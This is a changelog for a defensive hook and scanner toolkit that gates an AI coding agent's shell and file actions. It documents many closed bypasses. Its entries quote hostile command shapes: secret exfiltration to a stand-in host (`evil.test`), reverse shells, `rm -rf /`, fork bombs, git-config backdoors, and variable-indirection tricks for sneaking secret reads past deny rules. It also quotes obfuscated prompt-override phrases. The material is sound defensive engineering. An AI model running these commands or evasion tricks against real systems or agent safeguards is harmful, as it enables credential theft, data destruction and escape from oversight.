# Changelog

What changed, and when. Versions follow [semver](https://semver.org). While we
are pre-1.0, a minor bump (0.x.0) is where the interesting changes land: new deny
rules, new approves, new platforms.

Nothing was versioned before now, so 0.1.0 is the state the hooks were already in
when we started counting. Everything in this session is 0.2.0.

## [0.8.0] - 2026-09-07

A live bypass, a fail-open floor, and an installer that was handing out the permissions the
hooks exist to gate.

**Cross-segment variable indirection auto-approved secret reads.** `X=.env; cat $X` returned
`allow` — not a prompt, not a fallthrough. The assignment and the use land in different chain
segments, so no single segment ever contained the literal and every deny rule was blind to it,
while `cat $X` still matched a plain-read approve rule. `SECURITY-REVIEW.md` had this filed as
an accepted limit on the assumption it merely fell through; it did not.

Literal assignments are now collected in command order and expanded into one more match
variant, reusing the same mechanism as `${IFS}` / empty-quote de-obfuscation. No new deny
rules — the existing ones just get a string they can read, so an indirect read behaves exactly
like its direct form. Only literal values expand (no `$`, no backtick), so expansion can never
reveal anything the user did not literally type. Bounded to 32 assignments, 256 chars each.

Paired with an approve floor: a read verb whose argument still holds an expansion we could
*not* resolve (`cat $X` with no assignment, `D=$HOME/.ssh; cat $D/known_hosts`, `cat $(...)`)
no longer auto-approves. It falls through to the normal prompt. Narrow to read verbs and to
genuinely unresolved names, so `F=/t/out.txt; jq -r '.a' $F` still approves as before.

**Coverage gate.** Every place the engine gave up — an undecodable script, a heredoc parse
throw, a redirect-scan throw, nesting past the depth cap — ended in a silent fallthrough,
which under a broad allow rule or an auto-accept mode reads as ALLOW. Those now record a gap
and, after every deny pass has run but before the approve pass, degrade the verdict to `ask`.
A hard deny still wins; an unanalyzed command can no longer be laundered into an approval.
A *missing* script is deliberately not a gap — the command fails on its own, and treating it
as one would prompt on every mistyped path.

**Manual installer no longer grants blanket file permissions.** `settings-template.json`
granted `Read(*) Edit(*) Write(*) MultiEdit(*) NotebookEdit(*) Glob(*) Grep(*)` — the exact
tools these hooks gate — so a hook that failed to run left unprompted file access behind. The
plugin install path never granted it, making this pure asymmetric risk. The block is gone, and
`merge-settings.js` no longer replaces your existing `permissions` (it used to overwrite the
whole allow list). Manual-install users will see more prompts than before. That is the point.

A first review round on this diff found the floor was incomplete and the fix is folded in
here: `hasUnresolvedRead` checked only the first token, so every command wrapper walked past
it (`timeout 5 cat $X`, `command cat $X`, `sudo -u root cat $X`), as did a loop body
(`for f in .env; do cat $f; done`, whose segment starts with `do`). It now steps over shell
keywords and `CMD_WRAPPERS` using the same flag-arity table `tokenizedSensitiveRead` uses.
The three expansion ceilings also failed silently; padding past `VAR_MAX` with dummy
assignments suppressed the deny variant, and combined with the wrapper gap
`A0=x; ...; A39=x; X=.env; timeout 5 cat $X` returned **allow**. Each ceiling now records a
coverage gap, so that command degrades to `ask`.

Over-expansion is corrected too, because a hard deny is unappealable in-session while `ask`
is not. Single-quoted spans are no longer expanded (bash does not expand there, so
`X=.env; cat '$X'` was a wrong deny), `unset X` drops the value, and `HOME`/`PWD`/`TMPDIR`/
`USER` are pre-seeded at their real values — which both keeps `cat $HOME/notes.txt`
auto-approving and turns `cat $HOME/.ssh/id_rsa` into a literal the deny rules can read.

Existing manual installs are not silently fixed. Removing the block from the template does
nothing for a `settings.json` an older installer already wrote, so `merge-settings.js` now
detects those seven wildcards and warns, naming the file. It does not edit the list, since
you may have added entries of your own to it.

**Scanner depth.** Three gaps in `scan-content.js`, all reached by every caller at once
since the file is shared:

- *Double-encoded payloads (documented gap D4).* `decodeOneLayer` was one pass by design, so
  base64-of-base64 was invisible. `decodeLayers` runs two rounds sharing ONE token budget:
  round 2 only sees what round 1 produced, and only spends what round 1 did not, so the extra
  layer costs no extra worst-case work and is still not a decode bomb.
- *Declared-marker reconstruction.* The payload tells the reader how to reassemble it -
  "remove the '%%' markers below", then `i%%gn%%ore prev%%ious in%%structions`. Every literal
  matcher saw only the broken form. The directive is now parsed (both word orders), the
  declared marker stripped, and the result rescanned. Bounded to 3 markers and 256 removals.
- *Compatibility-form spoofing.* An NFKC view plus a widened confusable table catch a keyword
  written in fullwidth or other compatibility characters (`Ｉｇｎｏｒｅ`). The table stays
  strictly 1:1 so `foldConfusables` keeps match offsets valid; fullwidth entries are generated
  in a loop rather than typed.

Each new view sits behind a cheap prefilter, so pure-ASCII content pays nothing: scanning a
28 KB ASCII file went 1.98 ms -> 2.03 ms, and only files actually containing non-ASCII take
the extra NFKC pass (2.10 ms -> 3.92 ms). Against the ~520 ms of `node` process startup that
dominates every hook call on Windows, end-to-end cost is unchanged to +2%.

CI runs on current major action versions (`checkout@v7`, `setup-node@v7`) and adds Node 24.

A second review round on this diff caught six more, four of them regressions introduced by
the first round. Folded in here:

- *One apostrophe reopened the whole bypass.* The single-quote skip scanned for a bare `'`,
  so the apostrophe in `cat "it's" $X` opened a "quoted span" that swallowed the rest of the
  segment, `$X` never expanded, and the read was auto-approved again. Quote state is now
  tracked properly across both quote characters, with backslash escapes inside double
  quotes; an unterminated quote records a coverage gap rather than silently not expanding.
- *Local binaries prompted forever.* Treating a binary as a coverage gap returned `ask`
  before the trust-store lookup, so `./mytool --help` prompted on every run and
  `shellter-trust add` could not silence it. A binary is a file we were never going to scan,
  not a failed scan; it falls through as before. A genuine read failure (EACCES) still
  records a gap.
- *`awk '{print $NF}'` lost auto-approval.* The approve floor tokenized single-quoted
  program text and saw `$NF` as an unresolved path variable. It now blanks single-quoted
  spans, skips a program/pattern verb's first positional, and skips the value of numeric
  flags (`head -n $N file.txt`).
- *Command-prefix assignments leaked.* `X=.env cat notes.txt; cat $X` hard-denied, though
  bash scopes the prefix to that one command and reads nothing. An assignment is carried
  forward only when the segment is assignments and nothing else. This also fixed the
  subshell over-deny recorded as an accepted limit above, while `{ X=.env; cat $X; }` still
  denies because a brace group does run in the current shell.
- *`$PWD` used the hook's cwd* rather than the tool call's, which could mask a hit or
  manufacture one.
- *The marker-removal ceiling was silent.* Replaced the quadratic bounded slice loop with a
  linear `split`/`join`, so reconstruction is complete and there is no truncation point to
  go unrecorded.

**`shellter scan` — the half that was never guarded.** The hooks inspect what the agent
emits. Nothing inspected what it is given: a plugin's `SKILL.md` goes straight into context,
its `hooks.json` runs on lifecycle events before any tool call, and its `.mcp.json` names a
server whose tool descriptions the model reads as instructions. None of that crosses a
PreToolUse hook, so none of it was ever looked at.

`node hooks/shellter-scan.js <path>` (or `npm run scan --`) walks a bundle and reports
BH1/BH2/BH3 (shipped hooks, a hook that posts to a non-loopback URL, shipped blanket
permissions), LP2 (`allowed-tools` breadth), AS1 (reads `.claude/`, `mcp.json`, a peer
skill), SC1/SC2 (unpinned or plaintext MCP servers), plus the full injection and
shell-malice scanners over the bundle's files with BOTH tiers reported, since every file in
a skill bundle is in effect an instruction file. Exits 1 on any high finding. CLI, not a
hook: the answer only changes at install time.

Triage only - no AST, taint, YARA, or vulnerability database, and it cannot see a running
MCP server's tool descriptions. The README points at NVIDIA SkillSpector for that depth.

Running it against real installed plugins immediately found a false positive in its own
LP2 rule: `Bash(node *)` is scoped to node, not a grant of everything, and is now reported
as medium ("scoped to an interpreter that runs arbitrary code") rather than high.

**Derived scan views no longer re-report what the raw scan already found.** Stripping
markers or folding compatibility forms does not remove the original payload, so a single
hit was surfacing three times (`x`, `x:nfkc`, `x:marker-stripped`), burying the one view
that had actually found something new. On shellter's own tree that alone cut findings from
20 high / 51 medium to 8 / 36 with no loss of detection.

A third review round found eight more, including one regression from round two:

- *The view dedupe dropped an escalation.* Keying only on the signal name meant a derived
  view could not report `html-comment-action` as HIGH when the raw pass had already emitted
  it as MEDIUM - and that signal's severity is context-dependent (HIGH only when the comment
  names an exfil target). A marker-obfuscated payload that reconstructed into a real
  exfil comment therefore went from deny to **allow**. Dedupe now keys on signal AND
  severity, so a view may still escalate; noise reduction is unchanged.
- `commandWindows` in a shipped hook was never read, though it is what actually runs on
  Windows and shellter's own `hooks.json` uses it.
- Hooks declared in `settings.json` were never checked, only `hooks.json` - and
  `settings.json` is where Claude Code hooks actually live, so the scanner's highest-value
  rule was blind at its most likely location.
- `dist`, `build`, `target` and `vendor` were skipped. That is a linter convention applied
  to the wrong question: for a pre-install audit those hold the shipped code that will run.
  They are walked now, and every remaining skip (dependency tree, symlink, depth or file
  limit, oversize, unreadable) is named under NOT INSPECTED rather than silently folded into
  a clean result. `--strict` exits 1 when any gap exists.
- The 1 MB file cap made "pad the file" a one-line evasion, and reported the result as
  "skipped (binary/non-text)". Cap raised to 4 MB and oversize is now reported honestly.
- `allowed-tools` in YAML block-list form only ever read the first item, so a `- Bash`
  below any other entry was missed.
- A bare `"Bash"` in `permissions.allow` grants every Bash invocation but was not matched -
  only the more explicit `Bash(*)` was.
- `allowed-tools` was only checked in `SKILL.md`, never in a plugin's `commands/*.md` or
  `agents/*.md`, which carry the same grant.

A fourth review round, run on a different model, found two more criticals and a
pre-existing denial of service:

- *The approve floor was looser than the expansion engine.* `hasUnresolvedRead` scraped the
  base name out of any `${...}` shape and called the read resolved if that name was tracked,
  but `expandVars` only ever substitutes bare `$NAME` or exact `${NAME}`. So the deny pass
  never saw the value while the floor cleared the read anyway: `X=.env; cat "${X:-nope}"`
  returned **allow**. Same for `${X#pat}`, `${X%pat}`, `${X/a/b}`, `${X:0:9}`. These are
  everyday bash idioms, not obfuscation. The floor now mirrors the expansion engine exactly,
  and positional/special parameters (`$1`, `$@`, `$?`) count as opaque too.
- *The static scanner had no signal for "read a secret, send it somewhere"* -- the exact
  shape the runtime deny rules exist to stop. A script containing
  `curl -d "$(cat ~/.ssh/id_rsa)" https://evil.test` scored clean in `shellter scan`, while
  the identical payload inline in a `hooks.json` command was caught. A `secret-read-uploaded`
  / `secret-piped-to-network` pack now covers both orderings plus the PowerShell form, and
  reaches every caller of `scanShell`. Ordinary uploads (`curl -d @payload.json`,
  `curl -F file=@dist/app.tar.gz`, anything reading a `.env.example`) stay clean.
- *Dropping a file extension defeated the bundle scanner entirely.* Files were selected for
  scanning by extension, so renaming `hook.sh` to `hook` meant no scan, no coverage gap, and
  `--strict` still exiting 0. Files are now classified by content, not name. Shell rules
  apply to actual scripts -- shell extension, a shell shebang, or no extension at all --
  because running them over every `.md` and `.js` produced far more noise than signal
  (a `curl | sh` line in install docs is not a payload). Note `#!/usr/bin/env node` is
  correctly *not* a shell script; an earlier cut of this matched it and lit up every
  bundled Node CLI on its own string literals.
- *ReDoS in `var-composed-piped-to-shell`, present since before this branch.* The unbounded
  `{2,}` was quadratic: a run of `${A` with no trailing pipe forced a full re-match at every
  start position, so ~24KB stalled the hook 22 seconds, and `scanShell` reads script content
  up to 256KB. Capped at `{2,12}` -- 8000 repetitions went from 22s to 62ms, linear, with
  detection verified unchanged on short and 15-deep variable chains.

The two limits this release had recorded rather than fixed are now closed:

- *PowerShell variable indirection.* `$X = ".env"; Get-Content $X` reached the deny rules
  with the literal nowhere in sight, because the bash assignment pattern cannot match PS
  syntax. PS assignments now get
  their own pattern, names folded to lower case (PowerShell is case-insensitive), and a
  backtick as the in-string escape. Same literal-only rule as bash.
  PowerShell quoting is respected on the same terms as bash: a backtick escapes the next
  character everywhere (not just inside double quotes), single-quoted values do not expand,
  and `$env:`/`$using:` stay separate namespaces while `$script:`/`$global:` resolve. Names
  fold to lower case because PowerShell really is case-insensitive, so a later `$X` overwrites
  an earlier `$x`.
- *The installer warned only at three or more leftover wildcards*, so a half-cleaned
  `settings.json` went quiet while still blanket-approving tools these hooks gate. It warns
  on one.

One-hop variable aliases resolve on both paths. Once `cat $X` was closed, `X=.env; Y=$X;
cat $Y` was the obvious next move, and both shells were leaving it to a prompt. A value that
is exactly one already-known variable reference is now resolved through. Deliberately one hop,
against names already in the map: it cannot recurse or cycle, and it keeps the invariant that
expansion only ever reveals text the user literally typed, since the alias target was itself
a literal. A concatenation (`Y=$X$X`) or an unknown source (`Y=$UNSET`) stays unresolved.

Known limits, all landing on a prompt rather than an auto-approval: `Set-Variable` /
`New-Variable` assignment forms, PowerShell here-strings, and chains longer than one hop.

A fifth review round found the PowerShell half of this work was resting on a claim that was
simply false, plus a one-byte way to blind the bundle scanner:

- *PowerShell had no approve floor at all.* The `isPosh` branch of `checkSegmentApprove`
  returns before the bash floor, so `hasUnresolvedRead` was dead code on that path:
  `Get-Content $SomeUnknownVar` matched a read-only approve pattern and returned **allow**,
  no prompt, whatever the variable held. This release had claimed PS indirection "fell
  through to a prompt rather than auto-approving, so it was never a silent allow" - that was
  wrong, and verified wrong on `origin/main` too. It is pre-existing rather than a
  regression, but it is precisely the class the PS work claimed to close. Worse, hooks are
  stateless while PowerShell variables persist across tool calls, so no cross-segment trick
  is needed: send the assignment in one call and a bare `Get-Content $x` in the next. PS now
  has its own floor over the content-reading cmdlets and aliases; `Get-ChildItem`/`ls` list a
  directory and stay approvable.
- *`$env:`/`$using:` collided with a same-named local variable.* `$using = ".env";
  Get-Content $using:PATH` hard-denied, because the bare-name match consumed `using` and left
  `:PATH` dangling. A namespace prefix is not the local variable of that name, and a deny is
  unappealable, so this was a false positive introduced by this release. A `:` after the name
  now blocks expansion.
- *One NUL byte made a live script invisible to `shellter scan`.* An embedded NUL was the one
  skip that recorded no coverage gap, so a planted NUL meant no findings, no gaps, and exit 0
  even under `--strict`. `bash setup.sh` refuses such a file, but `. setup.sh` and
  `cat setup.sh | bash` run straight past it - and those are the shapes a hooks.json command
  or an install step uses. Classification is now by how text-like the bytes are rather than by
  the presence of a NUL: mostly-printable content is scanned with NULs stripped and the NULs
  themselves reported, while a genuine binary stays a silent skip because a .png is not a gap.

- *UTF-16 files went uninspected.* The printable-ratio test that separates a planted NUL
  from a real binary classifies every UTF-16 file as binary, because UTF-16 is roughly half
  NUL by construction - so a `.ps1` in the encoding Windows PowerShell's `Out-File` writes by
  default was silently skipped while the identical payload in UTF-8 was caught. Both BOMs and
  the BOM-less form (NULs sitting on one parity of byte offsets) are now decoded and scanned.
  A genuine binary is still a silent skip.

A sixth review round, on the round-five fixes themselves:

- *The namespace carve-out fired on bash.* The `$env:`/`$using:` exception added last round
  took an `isPosh` argument the bash call site never passed, so it read as `undefined` and
  treated any bash `$NAME:` as resolved regardless of whether the name was known:
  `cat $UNKNOWNVAR:foo` returned **allow**. Bash has no namespace concept, so the carve-out
  must never fire there at all.
- *Aliasing through a single-quoted value hard-denied a safe read.* Neither shell expands in
  single quotes, so `X=.env; Y='$X'; cat $Y` opens a file literally named `$X` -- resolving
  the alias to X's value denied a read the shell would never make.
- *The NUL classifier was gameable by padding.* A whole-file printable ratio is diluted by
  appending filler, so ~26% trailing NULs pushed a live script back under the threshold and
  into a silent skip. Switching to a printable AMOUNT then flagged every real binary carrying
  strings. Neither number is the right question: what separates them is WHERE the NULs sit.
  A trailing run is padding and is dropped before judging; a binary scatters NULs throughout
  and still skips silently. No magic size threshold either way.

Known and left, both landing on a prompt rather than an auto-approval: the PowerShell floor
does not split pipelines, so a read embedded behind an approved leading verb
(`Write-Output 1 | %{ Get-Content $x }`) is not caught, and the `:` carve-out is not scoped
to literal `env`/`using`, which costs a deny on `$SECRET:decoy` rather than granting one.

**Also:** the shared codex/agy adapter test had four stale assertions expecting a ChatML role
marker on an ordinary file to deny; 0.7.0 made that Class B (destination-gated), so the
fixtures now target an agent-instruction file and a new assertion pins the gate itself.
First CI: GitHub Actions on ubuntu (node 18/20/22) and windows (node 20).

738 tests.

## [0.7.1] - 2026-07-29

Two false positives from live use, both in the same family: a rule matching a *name* without
looking at what the command does with it.

`git config` backdoor keys — read vs write. `git config core.hooksPath` (no value) only prints
the setting; that is how you audit a repo for a hooks-path backdoor, and it was hard-denied.
The key now has to be followed by a value token to deny, so the write forms
(`git config core.hooksPath /tmp/evil`, `--global credential.helper store`) still block while
every read form (`git config <key>`, `git config --get <key>`) passes.

Program/pattern arguments are not paths. `jq -r '.issues[] | .key' out.json` was denied as
"reading a sensitive file" because the jq filter contains `.key`, which is in the secret-token
set (`id_rsa`, `.pem`, `.key`, …). Same shape for `rg '\.pem' src/` and `sed 's/.env/x/' f`.
The first positional of `jq`/`yq`/`sed`/`awk`/`grep`/`rg` is the program, not a file, so it is
now skipped — unless a flag already supplied the pattern, in which case the first positional
really is a file. `-e`/`--regexp`/`--expression` carry the pattern inline, so their value is
skipped too (`grep -e '\.pem' src/`); `-f`/`--file`/`--from-file` name a file holding it, so that
value stays checked (`grep -f ~/.aws/credentials src/` still denies). `jq -e` is `--exit-status`,
not a pattern flag, and is treated as such. Those six verbs are excluded from the substring rule
(which cannot tell a filter from a path) and covered by the tokenized rule instead, which now
runs per pipe stage so `ls | cat .env` is still caught. Real file arguments after the filter
(`jq -r '.a' ~/.aws/credentials`) still deny.

Four defects in that same skip logic were caught by review rounds on this diff and are fixed
here, all the same shape — a flag-parsing gap that let the real file argument land in the
skipped slot:

- A bare `--` now ends option parsing. `grep -- -e .env` reads the FILE `.env` with `-e` as a
  literal pattern, and was slipping through as a flag+value pair — a full-file dump primitive.
- The attached short-option form is recognized. `grep -fpats.txt .env`, `sed -es/a/b/ .env`,
  and the bundled `sed -nes/a/b/p .env` all supply the pattern in the flag token itself, so the
  next token is the file, not the pattern.
- `grep`/`rg` context/count flags (`-A`/`-B`/`-C`/`-m`) consume their number instead of letting
  it eat the pattern slot, so `grep -A 2 .env app.log` stops being denied.
- The tokenized rule steps over command wrappers (`sudo`, `env FOO=1`, `time`, `nohup`, `nice`,
  `timeout`, …). The substring rule caught those for free by matching the verb anywhere in the
  segment; moving these six verbs off it would otherwise have downgraded `env grep x .env` from
  deny to allow.
- Wrapper flags that take a separate value (`sudo -u root`, `env -u VAR`, `nice -n 5`) are
  modeled per wrapper, so the value is not mistaken for the command word. `env -u PATH grep foo
  .env` was the worst case: it reached the approve stage and was auto-approved outright.
- A wrapper flag's value is never allowed to swallow a read verb, so a wrong arity in that table
  degrades to one extra token checked rather than a blind spot (`ionice -t` and `sudo -h` are
  boolean and were initially mis-listed). An unknown wrapper flag falls back to the first read
  verb in the stage for the same reason.

Two adjacent holes surfaced while fixing the above and are closed here. `doas` had no
elevated-privilege floor at all — `sudo` asks, `doas` fell through — so it now asks the same way.
And `env` sat in the read-only approve list matched by a bare `\benv\b`, which auto-approved
anything of the form `env [-u VAR] <command>`; only bare `env` (which just dumps the environment)
is approved now, and `env <command>` gets a normal prompt.

One behaviour change falls out of this and is intended: a LONE positional to one of those six
verbs is the program, with input coming from stdin, so `sed .env`, `grep ~/.ssh/id_rsa` and
`jq ~/.aws/credentials` no longer deny — none of them opens the named file. Two positionals
still mean the second is a file (`sed 1p .env` denies). A 1087-command before/after sweep across
wrapper × verb × flag-form × secret-token found this to be the only class whose decision relaxed,
and no command that started denying.

Note for both: the path `~/.claude/projects/**/tool-results/**` was never the trigger — no
`.claude` token exists in the secret set — so no path allowlist was added.

## [0.7.0] - 2026-07-04

False-positive reduction + correctness hardening. Every prior audit pushed one direction —
block more — so nobody had checked whether the hooks now over-block safe work. They did. This
release makes shellter allow safe commands, `ask` on the genuinely fuzzy, and hard-`deny` only
real threats, while closing several silent-approve / fallthrough bypasses the review surfaced.
Suite 453 → 549 passing (benign-twin tests for every FP fix, attack-shape tests for every new
deny). All decisions verified against the live hooks, and a high-effort multi-agent code review
of the diff caught ten over-broad-exemption / regression defects that are fixed and regression-
tested (firewall read-flag case, pip `.git` archive URL, `bash -m` download-exec, quoted-redirect
gate bypass, dropped jailbreak-phrase family, case-insensitive socat, secrets-dir `.txt`, broad
credential-grep, parted read subcommands, dd Windows-file path).

Injection-on-write (WS1). `check-sensitive-files.js` ran a crude context-free pattern set AND
the disciplined `scanInjection`, both hard-denying — so writing a security write-up, a test
fixture, a chatbot system-prompt string, a `User:`/`Assistant:` transcript, `<system>` markup,
an INI `[system]` section, or `<!-- see http://… -->` was blocked. The crude set is retired.
`scanInjection` signals are now split: Class A (override **with** an exfil target, MCP tool-
poisoning, policy-puppetry, tag/bidi/variation-selector Unicode smuggling) still denies
everywhere; Class B (a bare override phrase, a role marker, a fake transcript, a lone HTML-
comment action) denies **only** when the write target is an agent-instruction file an agent
auto-ingests (`CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.mcp.json`, `.claude/**`, …). The same
gate is applied to the shell-redirect and heredoc write paths. `isAgentInstructionFile` is a
single shared export in `scan-content.js`.

PowerShell rules no longer fire on Bash (WS2). `grep -w hidden` (matched the `-WindowStyle
hidden` rule) and Elixir `iex "…"` (matched the `Invoke-Expression` rule) are fixed by anchoring
those two patterns to a real PowerShell context. The cross-platform secret-exfil rules
(`cp`/`tar`/`python` + secret) and the cmd.exe LOLBin rules still run on both tools, so Windows
coverage is unchanged.

Shell-idiom false positives (WS3), narrowed or moved to `ask`: `eval "$(ssh-agent)"` / `direnv`
/ `pyenv` / `starship` init idioms (generic eval → ask; eval of decoded/downloaded content still
denies); `source <(kubectl completion bash)`; appending to / `sed -i` your own `~/.bashrc` (→
ask; `~/.ssh/authorized_keys`, git hooks, CI configs still hard-deny); `LD_LIBRARY_PATH=` (→ ask;
`LD_PRELOAD` still denies); read-only `crontab -l` / `iptables -L` / `parted -l`; `pip/npm install`
from a VCS URL (`git+https`, `github.com`, `*.git`); `curl … | python -m json.tool`; `python -c`
touching network/`subprocess`/`os.remove` (→ ask; `os.system`/`socket`/`eval(` still deny);
`dd of=<local file>` (→ ask; `dd of=/dev/…` still denies); and a pager pipeline in
`git config core.pager` (a lone `|` no longer reads as RCE; `$(…)`/`sh -c` still deny).

Secret-token / sensitive-path over-breadth (WS4): `.crt` dropped (an X.509 cert is public);
a source file inside a `credentials/` or `secrets/` directory is treated as code, not a secret;
the Windows hive names `SAM`/`SYSTEM`/`SECURITY` require a registry `config\` path context, so a
repo file named `SECURITY` is no longer flagged; a `grep "api_key="` self-audit is allowed (only
concrete token shapes — AKIA/`ghp_`/JWT/Bearer — are blocked); `git push` to a feature branch
that merely contains `main`/`master` is not treated as a push to trunk; and `DROP TABLE` in a git
commit message is no longer flagged (a SQL client is now required).

Correctness / bypass hardening (WS5), new hard denies for shapes that previously auto-approved or
fell through: the eval-launder that reduced the flagship `rm` guard to a silent allow
(`command eval "rm -rf /"`, `timeout 5 eval …`) is closed by recursing the deny pass into an
`eval` literal; `chmod` world-writable modes (`777`/`o+w`); `curl -d "$(env)"` / a secret-env-var
POST to a URL; `php -r` fsockopen/exec, `socat EXEC:`, and `nc -c` reverse shells the `-e` rule
missed; classic fork bombs (`:(){ :|:& };:`); shell-history tampering (→ ask); and a `rm -rf`
split across a backslash-newline continuation (now joined before matching).

Accepted limits (documented, not coded — high FP cost or high complexity): cross-segment
`VAR=value; … $VAR` resolution, non-shell interpreter one-liners with a non-secret destructive
payload (`node -e "…rm -rf…"`), a public `.pem`/`.key` still reading as a secret, and double
base64/hex decoding. See `SECURITY-REVIEW.md`.

## [0.6.0] - 2026-07-02

Security-review hardening. A full-project audit (manual + multi-agent) found and a
runtime probe confirmed a class of shell-hook bypasses; this release closes them.
Existing suite stays green and gains regression tests for every fix.

Destructive `rm` (B1/B2). The guard was five regexes that required `r` and `f` in
one combined flag token immediately before an unquoted literal target, so
`rm -r -f /`, `rm -f -r /`, `rm -rf "/"`, `rm -rf --no-preserve-root /`, and
`rm -r -f ~` all slipped past. Replaced with a real parser (`rmDanger`): flags are
read order-independently (short clusters, `--recursive`/`--force`, interposed flags),
targets are quote-stripped, and `rm` is detected at every command position — start,
after `;`/`|`/`&`/`(`/backtick, and inside `$(...)` — so `` `rm -rf /etc` ``,
`$(rm -rf /opt)`, and `uv run rm -rf /etc` are caught. Any absolute path with a `..`
component is blocked as traversal; deep specific `/opt/projs/...` paths stay allowed.

Persistence / credential writes (A4/A5/A8). The rc/hook/CI write rules missed
`~/.ssh/authorized_keys`, `known_hosts`, in-place editors, and download-to-file. Added:
redirect/`tee`/append into any persistence or credential target; `cp`/`mv`/`install`
into an `.ssh` key; `sed -i`/`perl -i` of a persistence file; and `curl -o`/`wget -O`
onto a persistence path.

Shell obfuscation (A7). Deny rules now also test a de-obfuscated variant of each
segment (`${IFS}`/`$IFS` collapsed, empty `''`/`""` pairs removed) plus a token-level
sensitive-read check, so `cat${IFS}.env`, `cat .e''nv`, and `cat ".e"nv` are denied.
The chain splitter also honors backslash escapes, so `find -exec ... \;` is parsed as
one command.

Interpreter laundering + scripts (A1/A2). The approve pass now recurses into every
pipe stage and into `find -exec`/`xargs` children, so `echo x | xargs node` and
`find . -exec node x +` are no longer auto-approved on the first stage alone. `python`
is no longer blanket-approved; a bare `python script.py` (and ruby/node/perl/php/deno/
bun) is content-scanned like a shell script, and the `python -c` deny now covers
`os.remove`/`shutil`/`ctypes`/`urllib` and friends.

Data upload, openssl, git config (A6/B3/C1). Uploading a FILE to a remote URL
(`curl -T`, `curl --data @file`, `wget --post-file`) now asks (inline `-d '{json}'`
API calls stay approved). `openssl` reading an SSH/cloud private key
(`openssl rsa -in ~/.ssh/id_rsa`) is denied, while `openssl rsa -in server.key` key
work is not. Setting `core.editor`/`core.pager`/`diff.external`/`gpg.program` to a
value containing a shell command (`sh -c`, `;`, `|`, `$(...)`) is now a hard deny
(a plain `vim` still asks).

File hook coverage (A9). The `Read|Edit|Write|Glob|Grep` matcher now also gates
`MultiEdit` and `NotebookEdit`, so injected content or a sensitive path written
through those tools is scanned/blocked, not silently allowed.

Defense-in-depth. Script-flag suppression now honors only user-level
`~/.claude/settings.json` and gitignored project `settings.local.json`, never a
repo-committed `settings.json` (a cloned malicious repo could otherwise whitelist its
own payload, D1). The installer warns when `node` is not on PATH, since the hooks fail
open without it (D2).

Post-implementation review round. A second high-effort review OF THIS DIFF caught
regressions the first pass introduced, all fixed here: the destructive-`rm` parser is
now tokenizer-based so a backslash-escaped/quoted command name (`\rm`, `'rm'`, `"rm"`,
`env X=1 \rm`) is caught while `rm` mentioned inside a quoted commit message is not a
false match, and `~+`/`~-`/`~user` are treated as home; the shell-redirect injection
scan runs per pipe stage with no end-anchor so a trailing `| cat`/`&`/`#` or a
later-stage `echo … > f` can't hide it; `find` file-writing primaries
(`-fprintf`/`-fprint`/`-fls`) are no longer auto-approved; the written-content scan is
NOT truncated (a >256 KB write is scanned in full, no blind spot); a clean/trusted
script piped into an interpreter (`. ./ok.sh | node evil.js`) is no longer laundered
into auto-approve; `sed -i` on your own repo's CI workflow is allowed (CI stays covered
for redirect/download-into-place); `curl -d`'s file-upload gate matches only a leading
`@file` so inline JSON with an email is not flagged; and interpreted scripts are removed
from blanket auto-approve without shell-scanning them (no false "high-risk" prompts on
legit JS bundles).

## [0.5.4] - 2026-07-02

Patch: kills a false positive in `html-comment-action`. The rule matched an HTML
comment opener, up to 400 of any chars, a keyword, up to 400 more, then a closer —
and those `[\s\S]` runs crossed comment boundaries. So a decorative divider (a
`====== GLOBAL CHROME ======` section comment) sitting within ~400 chars of a benign
word like `token` or `http` (a design-token table, a URL) was flagged even though the
keyword lived in unrelated content or a separate comment. The body runs are now
tempered — `(?:(?!-->)[\s\S]){0,400}` — so the keyword must sit inside ONE comment.
Every real single-comment payload still fires (a `curl`+`http` or `exec`+`.env` combo
in one comment, and even weak `http`-only signals); no keywords were dropped, so
recall is unchanged. Bounded `{0,400}` both sides means no exponential backtracking.

## [0.5.3] - 2026-07-01

Patch: kills a false positive in the destructive-`rm` guard. `/opt` was in the
any-depth system-directory blocklist, so routine cleanup like `rm -rf
/opt/projs/<repo>/scratch.png` was denied as "destructive rm on system directory"
— but `/opt` is a user-writable software/project area, not a bare system dir. The
guard now blocks only wiping the root (`rm -rf /opt`, `/opt/`, `/opt/*`) or a
`..`-traversal that escapes it (`rm -rf /opt/../etc`), and lets a specific deep
path through. Every other system/home dir (`/etc`, `/usr`, `/home`, `/Users`, `~`,
…) stays strict — including their subpaths.

## [0.5.2] - 2026-06-29

Patch: kills a decode-layer false positive in the prompt-injection scanner. Core
hooks only; no API or config change.

### Fixed
- **High-entropy tokens tripped `homoglyph-mixed-script:decoded`.** The decode-one-
  layer pass matches any 24+ run of base64 characters, so a plain identifier (e.g. a
  27-letter method-name fragment in an `Edit`), a hash, or a minified blob was
  speculatively decoded into random bytes that coincidentally contained a Cyrillic
  letter, and the homoglyph matcher -- which matches any short cross-script letter run
  -- fired on the decoded layer. A pure-ASCII file edit was denied as prompt injection.
  Fix: the **homoglyph** matcher now runs on **literal content only**, not on a decoded
  layer (the random bytes of a decoded identifier are not rendered text, and a homoglyph
  hit there is a coincidental byte run). The rule is unconditional -- not gated on any
  "looks like garbage" property of the decoded bytes, since that signal is attacker-
  controllable and would be an evadable suppression. The other invisible-character
  matchers (bidi-override, variation-selector, zero-width, tag) are **unchanged**: they
  still scan the decoded layer, because those specific code points do not occur in a
  decoded identifier's bytes and so never caused this false positive -- a Trojan-Source
  / invisible-char payload smuggled through base64 is still detected.

### Added
- **Confusable-folding for override detection.** Before `OVERRIDE_RE` runs, Cyrillic and
  Greek letters that imitate ASCII are folded to the letter they spoof, so an override
  phrase disguised with lookalike characters matches the same as its ASCII form. This
  runs on **every layer, including the decoded one**, through the keyword path that
  already scans encoded payloads unconditionally -- so a homoglyph-spoofed override
  hidden in a base64 layer is caught (`instruction-override`), recovering the override
  case the literal-only homoglyph change would otherwise drop, with no evadable gate.
  Only `OVERRIDE_RE` is folded: it matches long multi-word phrases, so folding cannot
  turn real foreign-script prose into a match, and the short role-label matchers are
  left unfolded (a stray Cyrillic `аі:` must not fold into a fake `AI:` label). The fold
  map is the single source of truth for the confusable set the mixed-script detector
  uses, so the two cannot drift; folding is 1:1 and identity on ASCII.

  Note: a **non-keyword** homoglyph spoof (e.g. a credential-phishing lure) hidden in a
  base64 layer is no longer flagged on the decoded layer -- only spoofed override
  phrases are recovered there. Literal-content homoglyph detection is unchanged.

### Tests
- Core hook suite 375 -> 381: a long-identifier no-false-positive case; an invalid-UTF-
